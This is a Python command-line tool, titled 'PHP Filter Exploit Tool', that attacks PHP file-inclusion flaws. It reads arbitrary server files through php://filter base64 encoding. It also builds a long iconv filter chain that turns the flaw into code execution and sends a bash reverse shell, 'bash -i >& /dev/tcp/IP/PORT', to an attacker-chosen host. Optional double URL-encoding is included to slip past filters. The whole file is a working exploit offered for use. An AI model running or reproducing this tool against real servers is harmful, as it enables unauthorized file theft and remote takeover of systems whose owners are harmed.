import argparse
import requests
import base64
from urllib.parse import quote

def build_file_url(base_url, filename):
    payload = f"php://filter/read=convert.base64-encode/resource={filename}"
    return f"{base_url}{quote(payload)}"

# 修改函数签名以接受 encode_chars 和 encode_chars2
def build_reverse_shell_url(base_url, ip, port, encode_chars=None, encode_chars2=None):
    # 将 payload 分成需要编码的前缀和保持不变的后缀
    php_filter_prefix = "php://filter/"
    filter_content = (
        "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|"
        "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|"
        "convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|"
        "convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
        "convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
        "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|"
        "convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|"
        "convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|"
        "convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
        "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|"
        "convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
        "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|"
        "convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|"
        "convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
        "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|"
        "convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|"
        "convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|"
        "convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|"
        "convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
        "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|"
        "convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
        "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|"
        "convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|"
        "convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|"
        "convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|"
        "convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
        "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|"
        "convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&"

    )
    cmd_payload = "cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"
    
    # 第一次编码 - 确保 php://filter/ 不被编码
    if encode_chars:
        chars_to_encode = set(encode_chars.split(','))
        # 保持 php://filter/ 不变
        encoded_filter_content = ''.join(f'%{ord(c):02X}' if c in chars_to_encode else c for c in filter_content)
        encoded_prefix = php_filter_prefix + encoded_filter_content
    else:
        encoded_prefix = filter_content
    
    # 第二次编码 - 同样确保 php://filter/ 不被编码
    if encode_chars2:
        chars_to_encode2 = set(encode_chars2.split(','))
        final_prefix = php_filter_prefix  # 先保存 php://filter/ 部分
        
        # 只处理 filter_content 部分
        i = len(php_filter_prefix)
        while i < len(encoded_prefix):
            if encoded_prefix[i] == '%' and i + 2 < len(encoded_prefix):
                hex_part = encoded_prefix[i:i+3]
                if '%' in chars_to_encode2:
                    final_prefix += f'%25{hex_part[1:3]}'
                else:
                    final_prefix += hex_part
                i += 3
            elif encoded_prefix[i] in chars_to_encode2:
                final_prefix += f'%{ord(encoded_prefix[i]):02X}'
                i += 1
            else:
                final_prefix += encoded_prefix[i]
                i += 1
        
        payload = final_prefix + cmd_payload.format(ip=ip, port=port)
    else:
        payload = encoded_prefix + cmd_payload.format(ip=ip, port=port)
        
    return f"{base_url}{payload}"

def parse_headers(header_args):
    headers = {}
    for h in header_args or []:
        if ':' not in h:
            raise ValueError(f"Invalid header format: {h}")
        key, value = h.split(':', 1)
        headers[key.strip()] = value.strip()
    return headers

def main():
    parser = argparse.ArgumentParser(description='PHP Filter Exploit Tool')
    parser.add_argument('base_url', help='Base URL (e.g. http://example.com/path?parameter=)')
    
    parser.add_argument('-H', '--header', action='append', 
                      help='Custom HTTP headers (e.g. -H "Authorization: Basic ...")')
    
    parser.add_argument('-e', '--encode', 
                      help='Characters to URL encode (e.g. -e "i,y" to encode only i and y characters)')
    
    parser.add_argument('-e2', '--encode2', 
                      help='Characters to URL encode after first encoding (e.g. -e2 "%" to encode percent signs)')
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-f', '--file', help='File to read')
    group.add_argument('-r', '--reverse-shell', nargs=2, metavar=('IP', 'PORT'), 
                      help='Reverse shell IP and PORT')
    
    args = parser.parse_args()

    try:
        headers = parse_headers(args.header)
        
        if args.file:
            url = build_file_url(args.base_url, args.file)
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                try:
                    response_text = response.text.strip()
                    if not response_text:
                        print("Received empty response.")
                    else:
                        decoded = base64.b64decode(response_text).decode('utf-8', errors='ignore') # 添加 errors='ignore' 以处理可能的解码错误
                        print(f"Decoded content:\n{decoded}")
                except (base64.binascii.Error, UnicodeDecodeError) as decode_error:
                    print(f"Could not decode base64 or decode UTF-8: {decode_error}")
                    print(f"Raw response:\n{response.text}") # 打印原始响应以供调试
            else:
                print(f"Request failed with status code: {response.status_code}")
                print(f"Response content:\n{response.text}") # 打印失败时的响应内容

        elif args.reverse_shell:
            ip, port = args.reverse_shell
            url = build_reverse_shell_url(args.base_url, ip, port, args.encode, args.encode2)
            print(f"[*] Using URL: {url}") # 打印生成的 URL 以供调试
            print(f"Sending reverse shell payload to {ip}:{port}...")
            try:
                # 超时重定向
                response = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
                print(f"[*] Request sent. Status code: {response.status_code}")
            except requests.exceptions.Timeout:
                print("[!] Request timed out.")
            except requests.exceptions.RequestException as e:
                print(f"[!] Request error during reverse shell attempt: {e}")


    except ValueError as e:
        print(f"Header error: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
